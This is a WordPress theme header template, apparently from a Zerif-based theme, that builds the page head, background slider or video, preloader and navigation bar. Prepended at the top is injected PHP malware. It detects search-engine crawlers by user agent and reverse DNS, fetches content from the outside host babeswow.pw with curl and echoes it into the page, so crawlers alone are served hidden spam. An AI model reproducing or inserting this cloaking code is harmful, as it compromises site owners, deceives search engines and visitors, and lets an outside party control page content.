


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://babeswow.pw/cac/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><?php

/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 */

?><!DOCTYPE html>

<html <?php language_attributes(); ?>>

<head>

	<?php 
	if( function_exists('zerif_top_head_trigger') ):
		zerif_top_head_trigger(); 
	endif;	
	?>

    <meta charset="<?php bloginfo( 'charset' ); ?>">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="profile" href="http://gmpg.org/xfn/11">
    <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	
	<?php
	$zerif_google_anaytics = get_theme_mod('zerif_google_anaytics');
	if( !empty($zerif_google_anaytics) ):
		echo $zerif_google_anaytics;
	endif;
	?>

    <!--[if lt IE 9]>
    <script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/html5.js"></script>
    <link rel="stylesheet" href="<?php echo esc_url( get_template_directory_uri() ); ?>/css/ie.css" type="text/css">
    <![endif]-->
	
	<?php
	if ( ! function_exists( '_wp_render_title_tag' ) ) :
		function responsiveboat_old_render_title() {
		?>
		<title><?php wp_title( '-', true, 'right' ); ?></title>
		<?php
		}
		add_action( 'wp_head', 'responsiveboat_old_render_title' );
	endif;

    wp_head(); ?>
	
	<?php 
	if( function_exists('zerif_bottom_head_trigger') ):
		zerif_bottom_head_trigger(); 
	endif;	
	?>

	<script src="https://use.typekit.net/bvn8bbp.js"></script>
	<script>try{Typekit.load({ async: true });}catch(e){}</script>
</head>

<?php if(isset($_POST['scrollPosition'])): ?>

	<body <?php body_class(); ?> itemscope="itemscope" itemtype="http://schema.org/WebPage" onLoad="window.scrollTo(0,<?php echo intval($_POST['scrollPosition']); ?>)">

<?php else: ?>

	<body <?php body_class(); ?> itemscope="itemscope" itemtype="http://schema.org/WebPage">

<?php endif;

if( function_exists('zerif_top_body_trigger') ):
	zerif_top_body_trigger();
endif;

/*************************************************/
/**************  Background settings *************/
/*************************************************/

$zerif_background_settings = get_theme_mod('zerif_background_settings');

/* Default case when no setting is checked or Slider is selected */
if( empty($zerif_background_settings) || ($zerif_background_settings == 'zerif-background-slider') ):

	/* Background slider */
	$zerif_slides_array = array();

	for ($i=1; $i<=3; $i++){
		$zerif_bgslider = get_theme_mod('zerif_bgslider_'.$i);
		array_push($zerif_slides_array, $zerif_bgslider);
	}

	$count_slides = 0;

	if( !empty($zerif_slides_array) && is_home() ):

		echo '<div class="zerif_full_site_wrap">';

		echo '<div class="fadein-slider">';

		foreach( $zerif_slides_array as $key => $zerif_slide ):

			if ( !empty($zerif_slide) ):

				$keyx = $key+1;
				$zerif_vpos = get_theme_mod('zerif_vposition_bgslider_'.$keyx,'top');
				$zerif_hpos = get_theme_mod('zerif_hposition_bgslider_'.$keyx,'left');
				$zerif_bgsize = get_theme_mod('zerif_bgsize_bgslider_'.$keyx,'cover');
				if ($zerif_bgsize=='width'):
					$zerif_bgsize = '100% auto';
				elseif ($zerif_bgsize=='height'):
					$zerif_bgsize = 'auto 100%';
				endif;

				$zerif_slide_style ='background-repeat:no-repeat;background-position:'.$zerif_hpos.' '.$zerif_vpos.';background-size:'.$zerif_bgsize;

				echo '<div class="slide-item" style="background-image:url('.$zerif_slide.');'.$zerif_slide_style.'"></div>';

			endif;

		endforeach;

		echo '</div>';

		echo '<div class="zerif_full_site">';

	endif;

elseif( $zerif_background_settings == 'zerif-background-video' ):

	/* Video background */
	$zerif_background_video = get_theme_mod('zerif_background_video');
	if( !empty($zerif_background_video) && is_home() ):

		$zerif_background_video_thumbnail = get_theme_mod('zerif_background_video_thumbnail');

		if( !wp_is_mobile() ) {

			if( !empty($zerif_background_video_thumbnail) ):

				echo '<video class="zerif_video_background" loop autoplay preload="auto" controls="true" poster="'.$zerif_background_video_thumbnail.'" muted>';

			else:

				echo '<video class="zerif_video_background" loop autoplay preload="auto" controls="true" muted>';

			endif;

			echo '<source src="'.$zerif_background_video.'" type="video/mp4" />';
			echo '</video>';

		} else {

			echo '<div class="zerif_full_site_wrap">';

			echo '<div class="fadein-slider">';

			if( !empty($zerif_background_video_thumbnail) ) {

				echo '<div class="slide-item" style="background-image:url('.$zerif_background_video_thumbnail.')"></div>';

			} else {

				$page_bg_image_url = get_background_image();

				if ( !empty( $page_bg_image_url ) ) {

					$page_bg_image_url = get_background_image();

					echo '<div class="slide-item" style="background-image:url('.$page_bg_image_url.')"></div>';

				}
			}

			echo '</div>';

			echo '<div class="zerif_full_site">';

		}
	endif;

endif;

global $wp_customize;

/* preloader */
if(is_front_page() && !isset( $wp_customize ) && get_option( 'show_on_front' ) != 'page' ):

    $zerif_disable_preloader = get_theme_mod('zerif_disable_preloader');

    if( isset($zerif_disable_preloader) && ($zerif_disable_preloader != 1)):

        echo '<div class="preloader">';
        echo '<div class="status">&nbsp;</div>';
        echo '</div>';

    endif;

endif; ?>


		<header id="home" class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader" role="banner">

			<?php if(is_front_page()): ?>
				<div id="main-nav" class="navbar navbar-inverse bs-docs-nav navbar-black" role="banner">
					<div class="container">
						<div class="navbar-header responsive-logo">
							<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
								<span class="sr-only">Toggle navigation</span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
							</button>

							<?php
								$zerif_logo = get_theme_mod('zerif_logo');
								if(isset($zerif_logo) && $zerif_logo != ""):
									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;
										echo '<img src="'.esc_url( $zerif_logo ).'" alt="'.get_bloginfo('title').'" >';
									echo '</a>';
								else:
									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;
										echo "<h1 class='rb-site-title'>".get_bloginfo( 'name' )."</h1>";
										echo "<h2 class='rb-site-description'>".get_bloginfo( 'description' )."</h2>";
									echo '</a>';
								endif;
							?>

						</div>
						<nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation" id="site-navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" role="navigation">
							<?php wp_nav_menu( array('theme_location' => 'primary', 'container' => false, 'menu_class' => 'nav navbar-nav navbar-right responsive-nav main-nav-list' ,'fallback_cb'     => 'zerif_wp_page_menu')); ?>
						</nav>
					</div>
				</div>
				
				<div id="main-nav" class="navbar navbar-inverse bs-docs-nav navbar-black-init" role="banner">
					<div class="container">
						<div class="navbar-header responsive-logo">
							<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
								<span class="sr-only">Toggle navigation</span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
							</button>

							<?php
								$zerif_logo = get_theme_mod('zerif_logo');
								if(isset($zerif_logo) && $zerif_logo != ""):
									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;
										echo '<img src="'.esc_url( $zerif_logo ).'" alt="'.get_bloginfo('title').'" >';
									echo '</a>';
								else:
									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;
										echo "<h1 class='rb-site-title'>".get_bloginfo( 'name' )."</h1>";
										echo "<h2 class='rb-site-description'>".get_bloginfo( 'description' )."</h2>";
									echo '</a>';
								endif;
							?>

						</div>
						<nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation" id="site-navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" role="navigation">
							<?php wp_nav_menu( array('theme_location' => 'primary', 'container' => false, 'menu_class' => 'nav navbar-nav navbar-right responsive-nav main-nav-list' ,'fallback_cb'     => 'zerif_wp_page_menu')); ?>
						</nav>
					</div>
				</div>



			<?php else: ?>

				<div id="main-nav" class="navbar navbar-inverse bs-docs-nav" role="banner">
					<div class="container">

						<div class="navbar-header responsive-logo">

							<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">

							<span class="sr-only">Toggle navigation</span>

							<span class="icon-bar"></span>

							<span class="icon-bar"></span>

							<span class="icon-bar"></span>

							</button>

							<?php

								$zerif_logo = get_theme_mod('zerif_logo');

								if(isset($zerif_logo) && $zerif_logo != ""):

									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;

										echo '<img src="'.esc_url( $zerif_logo ).'" alt="'.get_bloginfo('title').'" >';

									echo '</a>';

								else:

									if( is_front_page() ):
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand rb-hidden-logo">';
									else:
										echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
									endif;

										echo "<h1 class='rb-site-title'>".get_bloginfo( 'name' )."</h1>";

										echo "<h2 class='rb-site-description'>".get_bloginfo( 'description' )."</h2>";

									echo '</a>';

								endif;

							?>

						</div>

						<nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation" id="site-navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" role="navigation">
							<?php wp_nav_menu( array('theme_location' => 'primary', 'container' => false, 'menu_class' => 'nav navbar-nav navbar-right responsive-nav main-nav-list' ,'fallback_cb'     => 'zerif_wp_page_menu')); ?>
						</nav>

					</div>

				</div>


			<?php endif; ?>
			<!-- / END TOP BAR -->